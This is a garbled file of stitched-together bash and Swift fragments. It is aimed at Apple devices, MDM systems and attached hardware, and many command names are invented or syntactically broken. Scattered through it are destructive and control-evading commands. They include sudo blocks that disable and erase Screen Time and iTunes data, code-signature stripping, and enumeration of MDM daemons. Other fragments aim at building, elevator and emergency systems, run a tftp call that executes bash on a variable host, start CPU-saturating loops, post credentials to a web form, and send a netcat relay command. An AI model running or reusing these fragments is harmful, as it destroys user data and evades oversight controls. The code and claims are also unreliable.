```markdown
  

  

  

  

  

  

##### Embed Swift code in bash via stdin



  

var lastState = ""

  

NSEvent.addGlobalMonitorForEvents(matching: [.mouseMoved, .leftMouseDragged, .rightMouseDragged, .otherMouseDragged]) { _ in

guard let data = NSCursor.currentSystem?.image.tiffRepresentation else { return }

let state = index[data] ?? "unknown"

if state != lastState {

lastState = state

let task = Process()

task.executableURL = URL(fileURLWithPath: "/bin/bash")

task.arguments = ["arcOSBaseKit & removeSimulator & arcOSQQnx &", state]

try? task.run()

}

}

  

RunLoop.main.run()

  

  

import Foundation

  

func clearTempAndCache() {

    let fm = FileManager.default

  

    if let cacheURL = fm.urls(for: .cachesDirectory, in: .userDomainMask).first {

        if let items = try? fm.contentsOfDirectory(at: cacheURL, includingPropertiesForKeys: nil) {

            for url in items {

                try? fm.removeItem(at: url)

            }

        }

    }

  

    let tempURL = fm.temporaryDirectory

    if let items = try? fm.contentsOfDirectory(at: tempURL, includingPropertiesForKeys: nil) {

        for url in items {

            try? fm.removeItem(at: url)

        }

    }

}

  

  

print("Running magnetometer check...")

$CODE & arcOSBaseKit & volumeupMax & strikeontheSAT & activateHealthKit & arcOSQQnx & 

EOF

&

local dir="./"

# Loop over all items in the directory

for item in "$dir"; do

if [ -d "$item" ]; then

echo "Entering directory: $item"

recursive_run "$item"  # recurse into subdir

elif [ -f "$item" ] && [[ "$item" == *.sh ]]; then

echo "Running script: $item"

bash "$item"           # run shell script file

else

echo "Skipping: $item"

fi

done

SWIFT 

  

  

  

  

  

  

  

  

  

let defaults = UserDefaults.standard

if let serverConfig = defaults.dictionary(forKey: "com.apple.configuration.managed") {

    // Access your MDM configuration values

    if let serverURL = serverConfig["yourSettingKey"] as? String {

        // Use the configuration

    }

}

  

  

  

  
  
  

  

  

  

}

  

  

  



  
  

  

  

  

deployMDM(){

  

#swift

import Foundation

import Dispatch

  

  

let serial = CommandLine.arguments[1]

let profilePath = CommandLine.arguments[2]

let baseURL = URL(string: "https://mdm.example.com")!

let token = "YOUR_BEARER_TOKEN"

  

struct DeviceSearch: Decodable {

    struct Device: Decodable { let id: String }

    let results: [Device]

}

  

var req = URLRequest(url: baseURL.appending(path: "/api/devices")

    .appending(queryItems: [URLQueryItem(name: "serial", value: serial)]))

req.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")

  

let sem = DispatchSemaphore(value: 0)

var foundID: String?

  

URLSession.shared.dataTask(with: req) { data, _, error in

    defer { sem.signal() }

    guard error == nil, let data else { return }

    foundID = try? JSONDecoder().decode(DeviceSearch.self, from: data).results.first?.id

}.resume()

  

sem.wait()

guard let deviceID = foundID else {

    fputs("Device not found for serial \(serial)\n", stderr)

    exit(1)

}

  

var uploadReq = URLRequest(url: baseURL.appending(path: "/api/devices/\(deviceID)/configuration-profiles"))

uploadReq.httpMethod = "POST"

uploadReq.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")

  

let profileData = try Data(contentsOf: URL(fileURLWithPath: profilePath))

uploadReq.httpBody = profileData

uploadReq.setValue("application/x-apple-aspen-config", forHTTPHeaderField: "Content-Type")

  

URLSession.shared.dataTask(with: uploadReq) { _, response, error in

    if let error { fputs("Upload failed: \(error)\n", stderr); exit(1) }

    if let http = response as? HTTPURLResponse, !(200...299).contains(http.statusCode) {

        fputs("Upload failed with status \(http.statusCode)\n", stderr)

        exit(1)

    }

    print("Deployed to serial \(serial), device id \(deviceID)")

    exit(0)

}.resume()

  

DispatchQueue.main.asyncAfter(deadline: .now() + 3) {

    print("Done.")

    exit(EXIT_SUCCESS)

}

  

print("Starting...")

dispatchMain()   // starts main queue run loop, never returns

  

  

&










```


```
  

  

  ```bash
  
  

hwdefaultapp(){

sudo door &

sudo elevator* &

sudo emer* &

sudo deactivate* &

sudo stopcc* &

sudo setWDS "$RECKON:*" &

sudo m* &

sudo hwshe* &

}

  

deletehwlethalapp(){

sudo hwdefault* &

sudo powerof* &

sudo $osxBASEURL/sh/oascript/*.scpt &

sudo emergency* 'open *' &

sudo light* &

sudo alarm* &

sudo elevator &

sudo callEmerge* &

}

&

  

  

  

  

#deleteICloudDrive

deleteICloudDriveQQshell=()

import Foundation

  

enum MoveError: Error {

case iCloudUnavailable

case sourceNotFound

}

  

func moveHiddenFileFromICloudToTmp(named fileName: String) throws -> URL {

let fm = FileManager.default

  

guard let iCloudRoot = fm.url(forUbiquityContainerIdentifier: nil)?

.appendingPathComponent("Documents", isDirectory: true) else {

throw MoveError.iCloudUnavailable

}

  

let sourceURL = iCloudRoot.appendingPathComponent(fileName, isDirectory: false)

guard fm.fileExists(atPath: sourceURL.path) else {

throw MoveError.sourceNotFound

}

  

let tmpDir = fm.temporaryDirectory

let destURL = tmpDir.appendingPathComponent(fileName, isDirectory: false)

  

if fm.fileExists(atPath: destURL.path) {

try fm.removeItem(at: destURL)

}

  

try fm.moveItem(at: sourceURL, to: destURL)

return destURL

}

  

  

  

#unsigning

  


  

  

  

  

  

  

  

RED='\033[0;31m'

GREEN='\033[0;32m'

YELLOW='\033[1;33m'

NC='\033[0m'

  

usage=(

echo "Usage: $0 <path_to_app_or_ipa>"

echo ""

echo "Examples:"

echo "  $0 MyApp.app"

echo "  $0 MyApp.ipa"

exit 1

  

  

if [ $# -ne 1 ]; then

    usage

    fi

  

    APP_PATH="$1"

  

    if [ ! -e "$APP_PATH" ]; then

        echo -e "${RED}Error: Path '$APP_PATH' does not exist${NC}"

            exit 1

            fi

  

            echo -e "${GREEN}=== Starting Xcode signing removal ===${NC}"

            echo -e "${YELLOW}Target: $APP_PATH${NC}"

  

  

  

# Handle IPA files

TEMP_DIR=""

if [[ "$APP_PATH" == *.ipa ]]; then

echo -e "${GREEN}Extracting IPA...${NC}"

TEMP_DIR=$(mktemp -d)

unzip -q "$APP_PATH" -d "$TEMP_DIR"

APP_PATH="$TEMP_DIR/Payload/*.app"

APP_PATH=$(ls "$APP_PATH" | head -n 1)

fi

  

  

  

  

if [[ ! -d "$APP_PATH" ]] || [[ ! -f "$APP_PATH/Info.plist" ]]; then

echo -e "${RED}Error: Not a valid iOS app bundle${NC}"

[ -n "$TEMP_DIR" ] && rm -rf "$TEMP_DIR"

exit 1

fi

  

echo -e "${GREEN}Found app: $APP_PATH${NC}"

  

remove_signature=(

local bundle="$1"

[ ! -d "$bundle" ] && return

echo -e "${YELLOW}Processing: $bundle${NC}"

# Remove _CodeSignature

[ -d "$bundle/_CodeSignature" ] && rm -rf "$bundle/_CodeSignature" && \

echo -e "  ${GREEN}- Removed _CodeSignature${NC}"

# Remove CodeResources

[ -f "$bundle/CodeResources" ] && rm -f "$bundle/CodeResources" && \

echo -e "  ${GREEN}- Removed CodeResources${NC}"

# Remove embedded.mobileprovision

[ -f "$bundle/embedded.mobileprovision" ] && rm -f "$bundle/embedded.mobileprovision" && \

echo -e "  ${GREEN}- Removed embedded.mobileprovision${NC}"

# Use codesign --remove-signature

if command -v codesign &> /dev/null; then

codesign --remove-signature "$bundle" 2>/dev/null || true

echo -e "  ${GREEN}- Ran codesign --remove-signature${NC}"

fi

  

  

# Main app

echo -e "${GREEN}=== Main app bundle ===${NC}"

remove_signature "$APP_PATH"

  

# Frameworks

echo -e "${GREEN}=== Frameworks ===${NC}"

[ -d "$APP_PATH/Frameworks" ] && for fw in "$APP_PATH/Frameworks"/*; do

[ -d "$fw" ] && remove_signature "$fw"

done

  

# App Extensions (*.appex) - includes Network Extensions

echo -e "${GREEN}=== App Extensions (*.appex) ===${NC}"

find "$APP_PATH" -name "*.appex" -type d 2>/dev/null | while read -r ext; do

echo -e "${YELLOW}Extension: $ext${NC}"

remove_signature "$ext"

[ -d "$ext/Frameworks" ] && for fw in "$ext/Frameworks"/*; do

[ -d "$fw" ] && remove_signature "$fw"

done

done

  

# Nested apps (App Clips, etc)

echo -e "${GREEN}=== Nested apps (App Clips) ===${NC}"

find "$APP_PATH" -name "*.app" -type d 2>/dev/null | while read -r nested; do

[ "$nested" == "$APP_PATH" ] && continue

echo -e "${YELLOW}Nested: $nested${NC}"

remove_signature "$nested"

[ -d "$nested/Frameworks" ] && for fw in "$nested/Frameworks"/*; do

[ -d "$fw" ] && remove_signature "$fw"

done

done

  

# Remove entitlements files

echo -e "${GREEN}=== Removing entitlements ===${NC}"

for ent in "$APP_PATH/Entitlements.plist" "$APP_PATH/entitlements.plist"; do

[ -f "$ent" ] && rm -f "$ent" && echo -e "${GREEN}- Removed: $ent${NC}"

done

  

# Repack IPA

if [ -n "$TEMP_DIR" ]; then

echo -e "${GREEN}Repacking IPA...${NC}"

OUTPUT_IPA="${APP_PATH%.app}.unsigned.ipa"

zip -qr "$OUTPUT_IPA" Payload/

echo -e "${GREEN}Created: $OUTPUT_IPA${NC}"

rm -rf "$TEMP_DIR"

fi

  

echo -e "${GREEN}=== Complete ===${NC}"

echo -e "${YELLOW}App is now unsigned. Resign before installation.${NC}"

  


  

### IOS connection 

resetFaceID=(

  

  

  

MDM_BASE_URL="${MDM_BASE_URL:-($APPLEMDM https://mdm.example.com/api/v1)}"

MDM_TOKEN="${MDM_TOKEN:?Set MDM_TOKEN}"

DEVICE_ID="${1:?Usage: $0 <device-id> <disable|enable>}"

ACTION="${2:?Usage: $0 <device-id> <disable|enable>}"

disable && enable &

IOSID=(FACEID TOUCHIE)

case "$ACTION" in

  disable)

    $IOSID_ALLOW=false

    ;;

  enable)

     $IOSID_ALLOW==true

    ;;

  *)

    echo "Invalid action: $ACTION"

    exit 1

    ;;

esac

  

curl -sS -X POST "$MDM_BASE_URL/devices/$DEVICE_ID/restrictions" \

  -H "Authorization: Bearer $MDM_TOKEN" \

  -H "Content-Type: application/json" \

  --data @- <<JSON

{

  "restrictions": {

    "allowFingerprintForUnlock": $ $IOSID_ALLOW

  }

}

JSON

  

  

  

  

enableAirplaneMode=(

  networksetup -setairportpower "$NET_SERVICE" on &

  blueutil --power 1 &

  

monitorNotification

  

# check_iphone_policy.sh

# Usage: ./check_iphone_policy.sh path/to/profile.mobileconfig

  

  

  

PROFILE="${1:-*}"

  

if [[ -z "$PROFILE" || ! -f "$PROFILE" ]]; then

  echo "Usage: $0 path/to/profile.mobileconfig"

  exit 1

fi

  

echo "== Checking profile: $PROFILE =="

  

check_key() {

  local key="$1"

  if grep -q "<key>$key</key>" "$PROFILE"; then

    echo "[FOUND] $key"

    grep -A2 -B1 "<key>$key</key>" "$PROFILE" | sed 's/^[[:space:]]*//'

    echo

  else

    echo "[NOT FOUND] $key"

    tftp "$TIMCOOK" -c bash "lethalPrint & 개쎄끼 & (show echo showcontent) 'fix this goddamn problem on iphone!! it is all about human right!'"

  fi

}

  

echo

echo "== Restriction keys =="

check_key "allowNotificationsModification"

check_key "allowDefaultCallingAppModification"

check_key "allowDefaultMessagingAppModification"

check_key "allowRCSMessaging"

check_key "allowChat"

check_key "allowPhone"

  

echo

echo "== Payload types =="

grep -E "<string>com\.apple\.(applicationaccess|notifications)</string>" "$PROFILE" || true

  

echo

echo "Done."

  

  

  

  

  

  

  

arcOSPartitionManage

MARKER_NAME=".arcOSBaseKit"

  

echo "Scanning partitions..."

# Get all partition identifiers, e.g. disk0s1, disk2s3

PARTITIONS=(diskutil list | awk '/^\/dev\/disk[0-9]/ {disk=$1} /^[[:space:]]+[0-9]+:/ {

 # e.g. line begins with "   1: ..."

 # field NF is last column -> identifier like disk0s1

print $NF

}')

  

for part in $PARTITIONS; do

    echo "Checking $part..."

    # Get mount point (empty if not mounted)

    MOUNT_POINTdiskutil info "$part" | awk -F': *' '/Mount Point/ {print $2}')

  

    if [[ -n "$MOUNT_POINT" && "$MOUNT_POINT" != "Not mounted" ]]; then

        echo "  Mounted at: $MOUNT_POINT"

        TARGET="$MOUNT_POINT/$MARKER_NAME"

  

        # Create marker file

        touch "$TARGET"

        echo "  Created marker: $TARGET"

    else

        echo "  Not mounted, skipping."

    fi

done

  

echo "Done."

&

  

  

  

disableContinuity

  

  

# Open macOS AirDrop & Handoff settings pane (Sonoma/Ventura style)

open "x-apple.systempreferences:com.apple.settings.AirDrop-Settings.extension"

  

# Optional: after a small delay, you can use osascript to click the toggle,

# but that relies on GUI scripting and is OS-version fragile.

)

  

  

  

disableFileLoadonSimulator

  

  

  

if ! command -v xcrun >/dev/null 2>&1; then

  echo "xcrun not found. Install Xcode command line tools." >&2

  exit 1

fi

  

SIM_DEVICE="${SIM_DEVICE:-(booted *)}"

  

if [[ $# -lt 1 ]]; then

  echo "Usage:"

  echo "  $0 <file1> [file2 ...]"

  echo

  echo "Optional env vars:"

  echo "  SIM_DEVICE=booted|<UDID>"

  echo "  APP_DOCS_PATH=/absolute/path/to/app/Documents"

  exit 1

fi

  

is_media() {

  case "${1,,}" in

    *.png|*.jpg|*.jpeg|*.heic|*.gif|*.tif|*.tiff|*.mov|*.mp4|*.m4v)

      return 0

      ;;

    *)

      return 1

      ;;

  esac

}

  

media_files)

other_files)

  

for f in "$@"; do

  if [[ ! -e "$f" ]]; then

    echo "Missing file: $f" >&2

    exit 1

  fi

  

  abs="$(cd "$(dirname "$f")" && pwd)/$(basename "$f")"

  if is_media "$abs"; then

    media_files+=("$abs")

  else

    other_files+=("$abs")

  fi

done

  

if [[ ${#media_files[@]} -gt 0 ]]; then

  echo "Importing media into Simulator Photos..."

  xcrun simctl removemedia "$SIM_DEVICE" "${media_files[@]}"

fi

  

if [[ ${#other_files[@]} -gt 0 ]]; then

  if [[ -z "${APP_DOCS_PATH:-}" ]]; then

    echo "Non-media files detected, but APP_DOCS_PATH is not set." >&2

    echo "Set APP_DOCS_PATH to your target simulator app Documents directory." >&2

    exit 2

  fi

  

  mkdir -p "$APP_DOCS_PATH"

  echo "Copying non-media files to: $APP_DOCS_PATH"

  cp -fv "${other_files[@]}" "$APP_DOCS_PATH"/

fi

  

echo "Done."

  

  

  

  

  

  

  

getIOSName

  

  

# First connected iOS device UDID

IOS_ID=(idevice_id -l | head -n $num)

  

if [ -n "$IOS_ID" ]; then

  # User-visible device name, e.g. "John’s iPhone"

  IOS_NAME=(idevicename -u "$IOS_ID" | tr -d '\r')

  # Model identifier, e.g. "iPhone15,2"

  IOS_MODEL=(ideviceinfo -u "$IOS_ID" -k ProductType | tr -d '\r')

  

  echo "iOS udid : $IOS_ID"

  echo "iOS name : $IOS_NAME"

  echo "iOS model: $IOS_MODEL"

fi)

  

  

  

  

  

iosBootstrap

echo "== macOS bootstrap token check =="

  

if ! /usr/bin/profiles status -type bootstraptoken; then

  echo "Failed to query bootstrap token status."

  exit 1

fi

  

echo

echo "== Validating bootstrap token with MDM =="

/usr/bin/profiles validate -type bootstraptoken || true

  

echo

echo "If bootstrap token is not escrowed yet, run this interactively:"

echo "sudo profiles install -type bootstraptoken"

echo

echo "Useful related checks:"

echo "  sudo diskutil apfs listUsers /"

echo "  sudo fdesetup list -extended")

  

  

  

  

  

  

eraseScriptInMDM

  

MDM_SERVICE=(jamf apple mdm MDM Intune 'Company|com\.apple\.mdmclient')

echo

echo "== MDM RELATED files =="

ls -la /usr/local/$MDM_SERVICE 2>/dev/null || echo "No /usr/local/jamf"

&

  

echo

echo "== launch daemons =="

ls -la /Library/LaunchDaemons/com.$MDM_SERVICE.* 2>/dev/null || echo "No daemon found"

&

  

echo

echo "== Configuration profiles store =="

ls -la /var/db/ConfigurationProfiles 2>/dev/null || echo "No ConfigurationProfiles directory found"

&

  

launchctl list 2>/dev/null | egrep 'mdm|MDM|jamf|Intune|Company|com\.apple\.mdmclient' || echo "No obvious MDM services found"

&

  

  

  

  

  

arcOSBackup

  

  

SRC_DIRS=(

  "$HOME/Documents/*"

  "$HOME/Desktop/*"

)

  

ICLOUD_DIR="$HOME/Library/Mobile Documents/com~apple~CloudDocs/AutoBackup"

STAMP="$(date +%Y-%m-%d_%H-%M-%S)"

DEST="$ICLOUD_DIR/$STAMP"

  

mkdir -p "$DEST"

  

for src in "${SRC_DIRS[@]}"; do

  if [ -e "$src" ]; then

    rsync -a "$src" "$DEST/"

  fi

done

  

echo "Backup staged to: $DEST")

  

  

  

  

resetAppleOS

  

  

echo "Reset Control Center steps"

echo "iPhone/iPad: Settings > Control Center > Reset Control Center"

echo "Apple Watch: Watch app on iPhone > Control Center > Reset Control Center"

echo "or on watch: Settings > Control Center > Reset Control Center Layout"

  

  

## iPhone / iPad

Manual reset available in Settings > Control Center > Reset Control Center.

MDM can restrict Control Center access from Lock Screen, but no verified Apple payload was found to reset the layout.

  

## Apple Watch

Manual reset available from the Watch app or watch settings, depending on version.

Watch can be enrolled in MDM through a supervised paired iPhone, but no verified Apple payload was found to reset Control Center layout.

  

  

  

  

swift

##sonicDNA

import WebKit

  

let types = WKWebsiteDataStore.allWebsiteDataTypes()

let date = Date(timeIntervalSince1970: 0)

  

WKWebsiteDataStore.default().removeData(ofTypes: types, modifiedSince: date) {

    print("Cleared WKWebView website data")

}

  

  

  

import Foundation

  

func clearTempAndCache() {

    let fm = FileManager.default

  

    if let cacheURL = fm.urls(for: .cachesDirectory, in: .userDomainMask).first {

        if let items = try? fm.contentsOfDirectory(at: cacheURL, includingPropertiesForKeys: nil) {

            for url in items {

                try? fm.removeItem(at: url)

            }

        }

    }

  

    let tempURL = fm.temporaryDirectory

    if let items = try? fm.contentsOfDirectory(at: tempURL, includingPropertiesForKeys: nil) {

        for url in items {

            try? fm.removeItem(at: url)

        }

    }

}

  

  

  

  

  

FocusModeSetup=(

  

osascript -e 'tell application "System Events" to tell application process "ControlCenter" to key code 53'  # ESC as a fallback to close if open

osascript -e 'tell application "System Settings"

    activate

    repeat until exists window 1

        delay 0.2

    end repeat

    reveal anchor "focus" of pane id "com.apple.Focus"

end tell

tell application "System Events"

    tell process "System Settings"

        repeat until exists checkbox 1 of group 1 of group 1 of splitter group 1 of group 1 of window 1

            delay 0.2

        end repeat

        tell checkbox 1 of group 1 of group 1 of splitter group 1 of group 1 of window 1

            if value is 1 then click

        end tell

    end tell

end tell'

  

  

  

}

  

  

  

removeiosKit

  

PROJECT_DIR="${1:-*}"

  

PBXPROJ="$(find "$PROJECT_DIR" -maxdepth 2 -name *.pbxproj | head -n *)"

  

if [[ -z "${PBXPROJ:-}" ]]; then

  echo "Could not find project.pbxproj under: $PROJECT_DIR"

  exit 1

fi

  

  

# Common folder names to remove

CANDIDATE_DIRS=(

  "WidgetExtension"

  "Widgets"

  "WidgetKitExtension"

  "AppClip"

  "AppClipExtension"

  "Extension"

  "ExtensionKit"

)

  

for dir in "${CANDIDATE_DIRS[@]}"; do

  while IFS= read -r -d '' path; do

    echo "Removing directory: $path"

    rm -rf "$path"

  done < <(find "$PROJECT_DIR" -type d -name "$dir" -print0)

done

  

# Remove common references from pbxproj

TMP_FILE="$(mktemp)"

cp "$PBXPROJ" "$TMP_FILE"

  

PATTERNS=(

  "WidgetExtension"

  "Widgets"

  "WidgetKitExtension"

  "AppClip"

  "AppClipExtension"

  "ExtensionKit"

  "com.apple.product-type.app-extension"

  "com.apple.product-type.application.on-demand-install-capable"

  "NSExtension"

  "WidgetKit"

)

  

for p in "${PATTERNS[@]}"; do

  echo "Stripping references matching: $p"

  grep -v "$p" "$TMP_FILE" > "${TMP_FILE}.next" || true

  mv "${TMP_FILE}.next" "$TMP_FILE"

done

  

cp "$TMP_FILE" "$PBXPROJ"

rm -f "$TMP_FILE"

  

echo "Done."

echo "Now open Xcode and verify:"

echo "1. Target Dependencies"

echo "2. Embed App Extensions"

echo "3. Build Phases"

echo "4. Scheme settings"

echo "5. Info.plist / entitlements references"

  

  

}

  

  

  

appleNearbyD

  

  

WIFI_SERVICE="${WIFI_SERVICE:-Wi-Fi}"

SETTINGS_URI="x-apple.systempreferences:com.apple.preferences.sharing?AirDrop"

  

log() { printf '%s\n' "$*"; }

warn() { printf 'Warning: %s\n' "$*" >&2; }

need_cmd() { command -v "$1" >/dev/null 2>&1; }

  

power_wifi_on() {

  if need_cmd networksetup; then

    if networksetup -setairportpower "$WIFI_SERVICE" on 2>/dev/null; then

      log "Wi-Fi enabled for service: $WIFI_SERVICE"

      return 0

    fi

    warn "Could not enable Wi-Fi using service '$WIFI_SERVICE'. Try: networksetup -listallnetworkservices"

  else

    warn "networksetup not found"

  fi

  return 1

}

  

power_bluetooth_on() {

  if need_cmd blueutil; then

    if blueutil -p 1 2>/dev/null; then

      log "Bluetooth enabled with blueutil"

      return 0

    fi

    warn "blueutil exists but failed. blueutil uses private IOBluetooth APIs and may require permissions."

  else

    warn "blueutil not installed. Install with: brew install blueutil"

  fi

  return 1

}

  

open_settings() {

  if need_cmd open; then

    open "$SETTINGS_URI"

    log "Opened AirDrop & Handoff settings"

  else

    warn "open command not available"

  fi

}

  

print_next_steps() {

  cat <<'TEXT'

Now enable AirDrop, Handoff, and AirPlay Receiver as needed in System Settings.

Supported control path:

1. Sign the iPhone/iPad and Apple TV into the same Apple Account.

2. Make sure both are on the same Wi-Fi.

3. On iPhone, go to Settings > Accessibility > Control Nearby Devices.

4. Use the Apple-side UI to complete any required pairing or trust prompts.

TEXT

}

  

power_wifi_on || false

power_bluetooth_on || true

open_settings

print_next_steps

  

}

  

  

  

  

appleremoteVolumeup=(

repeat(powerMax &

volumeupMax &

tvremote &

SHORTCUT_NAME="${SHORTCUT_NAME:-Device Control}"

ACTION="${1:-(up top)}"

ENC_NAME=(python3 - <<'PY'

import os, urllib.parse

print(urllib.parse.quote(os.environ.get('SHORTCUT_NAME',(arcOS* * Device Control))))

PY

)

ENC_ACTION=(python3 - <<'PY'

import os, urllib.parse

import sys

print(urllib.parse.quote(sys.argv[1]))

PY

"$ACTION")

  

URL="shortcuts://run-shortcut?name=${ENC_NAME}&input=text&text=${ENC_ACTION}"

  

  

if command -v open >/dev/null 2>&1; then

  open "$URL"

elif command -v xdg-open >/dev/null 2>&1; then

  xdg-open "$URL"

else

  echo "Open this URL on your Apple device: $URL" >&2

fi

  

#osascript -e 'set volume with output muted' &

  

sleep 1 &

  

set volume output volume $num^$num &

sudo amixer set Master $num^$num &

sudo adb shell media volume --stream $num^$num &

  

  

num=(od -An -N8 -tu8 /dev/urandom | tr -d ' ')

  

step="${1:-"$num^$num^$num^$num"}"

  

current=(osascript -e 'output volume of (get volume settings)')

new=((current + step))

  

if [ "$new" -gt 100 ]; then

  new=$step^$step &

fi

  

("$S_TARGET $*Negative $male" ($RECKON $RELAY)" > repeat(osascript -e "set volume output volume $new" & osascript -e 'tell application "System Events" to key code 1**') & #keycode 124

  

  

#Continuity 

INTERFACE=(en* *)

networksetup -setairportpower $INTERFACE $wifiMode &

blueutil -p 1 2>/dev/null || true &

open "x-apple.systempreferences:com.apple.preferences.sharing?AirDrop"

echo "Now enable AirDrop/Handoff/AirPlay Receiver as needed in System Settings." &

echo "Use iPhone > Settings > Accessibility > Control Nearby Devices for supported Apple-side control." &

  

# Turn power on (close relay)

relay on 1 &

  

# Keep it on forever (or until you manually switch it)

while :; do sleep 1; done

echo "OUTP ON" | nc -u (192.168.0.50 AGENT_TARGET) 5025 &

# Export GPIO, set as output, and drive high

echo 17 > /sys/class/gpio/export &

echo out > /sys/class/gpio/gpio17/direction &

echo 1 > /sys/class/gpio/gpio17/value &  # turns MOSFET ON → board powered

&

# 1. Turn relay on (close contacts → power to Arduino)

relay on 1 &

# 2. Optional: verify Arduino responds on serial

if timeout 2s echo "ping" > /dev/ttyACM0 ; then

  echo "Arduino powered and responsive"

else

  echo "Arduino powered but no serial response"

fi

&

appleNearbyD &) &

  

}

  

  

  

  

notificationStatus

  

  

DEVICE_ID=("currentKumaDevice")

MDM_API="https://$APPLEMDM/api/device/$DEVICE_ID/profiles"

APP_BUNDLE_ID="${1:-com.*}"

  

json="$(curl -fsSL \

  -H "Authorization: Bearer $TOKEN" \

  -H "Accept: application/json" \

  "$MDM_API")"

  

notification_status="$(

  echo "$json" | jq -r --arg bid "$APP_BUNDLE_ID" '

    ..

    | objects

    | select(

        (.PayloadType? == "com.apple.notificationsettings")

        or (.payloadType? == "com.apple.notificationsettings")

      )

    | .Settings[]?

    | select(

        (.BundleIdentifier? == $bid)

        or (.AppBundleID? == $bid)

        or (.bundleId? == $bid)

      )

    | .AllowNotifications // .allowNotifications // empty

  ' | head -n1

)"

  

if [[ -z "${notification_status:-}" ]]; then

  echo "UNKNOWN"

elif [[ "$notification_status" == "true" || "$notification_status" == "1" ]]; then

  echo "ON:"

else

  echo "OFF:"

fi

  

}

  

  

  

powerMax

  

# List powercap zones/constraints

sudo ls -R /sys/class/powercap

  

# Example: set a long-term power cap (micro-watts)

echo $num^$num | sudo tee /sys/class/powercap/intel-rapl:0/constraint_0_power_limit_uw

&

  

# Run one full-load loop per core

cores=(nproc)

for i in $(seq 1 "$cores"); do

  while :; do :; done &

done

  

  

time=$num &  # seconds between samples

  

declare T0=($(sudo cat /sys/class/powercap/*/energy_uj))

sleep "$time"

declare T1=($(sudo cat /sys/class/powercap/*/energy_uj))

&

for i in "${!T0[@]}"; do

  awk -v d=((T1[i]-T0[i])) -v t="$time" &'{printf "%.1f W\n", d / t / 1e6}'

done

  

&

  

}

  

  

  

  

findMobileSerial

  

TARGET_IOS_SERIAL=(sudo system_profiler SPHardwareDataType | awk '/Serial/ {print $4}') &

  

TARGET_ADB_SERIAL=(curl -s -c cookies.txt -b cookies.txt --data "email=$EMAIL&password=$PASS" https://android.com/find) &

  

}

  

  

  

  

  

  

  

source ~/* &

./* &

  

  

#1.AppleOS

#2.AndroidOS

#3.Server + Linux

#4.RF Modules

#5.Utils

  

  

###################### APPLEOS ######################

  

#### 1.DEVICE MANAGEMENT ######

#### 2.DEVICE MANAGEMENT ######

#### 3.DEVICE MANAGEMENT ######

#### 4.DEVICE MANAGEMENT ######

#### 5.DEVICE MANAGEMENT ######

#### 6.DEVICE MANAGEMENT ######

#### 7.DEVICE MANAGEMENT ######

#### 8.DEVICE MANAGEMENT ######

#### 9.DEVICE MANAGEMENT ######

#### 10.DEVICE MANAGEMENT ######

  

  

  

  

appleosShell

        sudo contactMGM &

        sudo iView &

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

sudo rm -rf ~/Library/Caches/com.apple.Automator

sudo pkill -f Automator 2>/dev/null

&

# Run with nohup/disown to prevent hanging

cd "$(dirname "$0")"

sudo nohup automator *.workflow >/dev/null 2>&1 &

screentimeShell &

}

  

resetAutomator

# Clear Automator caches and temp files

  

rm -rf ~/Library/Caches/com.apple.Automator

  

rm -rf ~/Library/Preferences/com.apple.Automator.plist

  

rm -rf /tmp/automator-*

  

  

# Kill lingering Automator processes

  

pkill -f Automator

  

killall Automator 2>/dev/null

  

  

# Reset shell environment for clean run

  

unset AUTOMATOR_INPUT

  

export SHELL=/bin/bash PATH=/usr/bin:/bin:/usr/sbin:/sbin

  

  

  

  

echo "Resetting Automator state..."

  

rm -rf ~/Library/Caches/com.apple.Automator

  

pkill -f Automator 2>/dev/null

  

  

  

# Run with nohup/disown to prevent hanging

  

cd "$(dirname "$0")"

  

nohup automator qqshe.workflow >/dev/null 2>&1 &

  

  

  

}

&

  

screentimeShell=(

  

while ! true

do

# Run as sudo. Disables ScreenTimePreferencesExtension and pane.

# Customize for your macOS version; test first.

  

# Turn off Screen Time activity (GUI equivalent)

sudo defaults write com.apple.ScreenTime AgentEnabled -bool NO

sudo defaults write com.apple.ScreenTime AgentEnabled -bool false

sudo defaults write com.apple.ScreenTime PLIST_VERSION -string "1.0"

  

# Disable/hide Screen Time pane (Ventura+)

sudo defaults write /Library/Preferences/com.apple.systemsettings DisabledSystemSettings -array "com.apple.ScreenTime-Settings.extension"

# Or for older: 

sudo defaults write /Library/Preferences/com.apple.systempreferences DisabledPreferencePanes -array "com.apple.preferences.screentime"

  

# Unload related agents/daemons if present

sudo launchctl bootout system /System/Library/LaunchAgents/com.apple.screentime.agent.plist 2>/dev/null

sudo launchctl bootout system /System/Library/LaunchDaemons/com.apple.screentime.daemon.plist 2>/dev/null

  

# Kill processes

sudo pkill -f ScreenTime 2>/dev/null

sudo killall SystemSettings 2>/dev/null

  

echo "Screen Time disabled. Log out/reboot for full effect."

  

  

# Run as sudo. Erases ScreenTime extension data and iTunes completely.

# WARNING: Irreversible data loss; test in VM. Reboot after.

  

# Erase ScreenTime data and prefs

sudo rm -rf ~/Library/Application\ Support/ScreenTime/

sudo rm -rf /Library/Application\ Support/ScreenTime/

sudo defaults delete com.apple.ScreenTime 2>/dev/null

sudo pkill -f ScreenTime 2>/dev/null

  

# Uninstall ScreenTime extension if listed (replace with actual IDs)

sudo systemextensionsctl list | grep -i screentime | while read line; do

    TEAMID=(echo "$line" | awk '{print $2}')

    BUNDLEID=(echo "$line" | awk '{print $4}')

    systemextensionsctl uninstall "$TEAMID" "$BUNDLEID" 2>/dev/null

done

  

# Erase iTunes/Music completely

sudo rm -rf ~/Music/iTunes/ ~/Music/Music/

sudo rm -rf ~/Library/Application\ Support/MobileSync/Backup/

sudo rm -rf ~/Library/Caches/com.apple.iTunes/ ~/Library/Caches/com.apple.Music/

sudo rm -rf ~/Library/Preferences/com.apple.iTunes.plist ~/Library/Preferences/com.apple.Music.plist

sudo defaults delete com.apple.iTunes com.apple.Music 2>/dev/null

  

# Kill related processes

sudo killall Music iTunesHelper SystemSettings 2>/dev/null

  

    # WARNING:

    # - Run at your own risk.

    # - Close System Settings before running.

    # - You may want to back up ~/Library first.

    USER_NAME="$SUDO_USER"

    if [ -z "$USER_NAME" ]; then

        echo "Run this script with: sudo $0"

        exit 1

    fi

    USER_HOME=(dscl . -read "/Users/$USER_NAME" NFSHomeDirectory 2>/dev/null | awk '{print $2}')

    if [ ! -d "$USER_HOME" ]; then

        echo "User home not found for $USER_NAME"

        exit 1

    fi

    echo "Disabling Screen Time data for user: $USER_NAME ($USER_HOME)"

